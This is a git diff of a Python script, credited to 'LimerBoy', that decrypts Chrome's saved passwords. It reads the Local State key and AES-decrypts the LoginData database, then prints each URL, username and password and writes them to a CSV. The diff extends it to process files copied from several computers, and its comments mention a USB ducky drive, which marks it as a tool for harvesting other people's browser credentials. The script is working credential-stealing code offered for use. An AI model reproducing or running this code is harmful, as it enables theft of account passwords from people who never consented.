@@ -1,6 +1,6 @@
 #Full Credits to LimerBoy
 from os import environ
-from os.path import normpath
+from os import path
 from json import loads
 from base64 import b64decode
 from win32crypt import CryptUnprotectData
@@ -15,8 +15,8 @@ from Cryptodome.Cipher import AES
 #CHROME_PATH_LOCAL_STATE = normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(environ['USERPROFILE']))
 #CHROME_PATH = normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(environ['USERPROFILE']))
 
-CHROME_PATH_LOCAL_STATE = normpath(r"D:\pass\LocalState")
-CHROME_PATH = normpath(r"D:\pass")
+CHROME_PATH = path.normpath(r"D:\pass") # TODO: change this to your path to the usb ducky drive
+CHROME_PATH_LOCAL_STATE = path.normpath(r"D:\pass\LocalState")
 
 def get_secret_key():
     try:
@@ -59,47 +59,59 @@ def decrypt_password(ciphertext, secret_key):
     
 def get_db_connection(chrome_path_login_db):
     try:
-        print(chrome_path_login_db)
+        print("database: ", chrome_path_login_db)
         copy2(chrome_path_login_db, "Loginvault.db") 
         return connect("Loginvault.db")
     except Exception as e:
         print("%s"%str(e))
         print("[ERR] Chrome database cannot be found")
         return None
-        
+
+def getLoginDataIds(pathToChrome):
+    for file in listdir(pathToChrome):
+        # find the id of the files (five digits at the end of the filename)
+        if path.isfile(path.join(pathToChrome, file)) and "LocalState" in file:
+            yield file.split('.')[1]
+
+
 if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
         with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
-            #(1) Get secret key
-            secret_key = get_secret_key()
-            #Search user profile or default folder (this is where the encrypted login password is stored)
-            #(2) Get ciphertext from sqlite database
-            chrome_path_login_db = normpath(r"%s\LoginData"%(CHROME_PATH))
-            conn = get_db_connection(chrome_path_login_db)
-            if(secret_key and conn):
-                cursor = conn.cursor()
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for index,login in enumerate(cursor.fetchall()):
-                    url = login[0]
-                    username = login[1]
-                    ciphertext = login[2]
-                    if(url!="" and username!="" and ciphertext!=""):
-                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                        #(4) Use AES algorithm to decrypt the password
-                        decrypted_password = decrypt_password(ciphertext, secret_key)
-                        print("Sequence: %d"%(index))
-                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
-                        print("*"*50)
-                        #(5) Save into CSV 
-                        csv_writer.writerow([index,url,username,decrypted_password])
-                #Close database connection
-                cursor.close()
-                conn.close()
-                #Delete temp login db
-                remove("Loginvault.db")
+            
+            for fileId in getLoginDataIds(CHROME_PATH):# get the random id at end of file
+                # for every computer the files where taken from get the passwords
+                CHROME_PATH_LOCAL_STATE = path.normpath(r"D:\pass\LocalState.{}".format(fileId))
+                #(1) Get secret key
+                secret_key = get_secret_key()
+                #(2) Get ciphertext from sqlite database
+                for file in listdir(CHROME_PATH):
+                    if path.isfile(path.join(CHROME_PATH, file)) and "LoginData" in file and fileId in file:
+                        chrome_path_login_db = path.normpath(r"%s\%s"%(CHROME_PATH, file))
+                        conn = get_db_connection(chrome_path_login_db)
+                        if(secret_key and conn):
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                            for index,login in enumerate(cursor.fetchall()):
+                                url = login[0]
+                                username = login[1]
+                                ciphertext = login[2]
+                                if(url!="" and username!="" and ciphertext!=""):
+                                    #(3) Filter the initialisation vector & encrypted password from ciphertext 
+                                    #(4) Use AES algorithm to decrypt the password
+                                    decrypted_password = decrypt_password(ciphertext, secret_key)
+                                    print("Sequence: %d"%(index))
+                                    print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
+                                    print("*"*50)
+                                    #(5) Save into CSV 
+                                    csv_writer.writerow([index,url,username,decrypted_password])
+                            #Close database connection
+                            cursor.close()
+                            conn.close()
+                            #Delete temp login db
+                            remove("Loginvault.db")
     except Exception as e:
         print("[ERR] "%str(e))
         
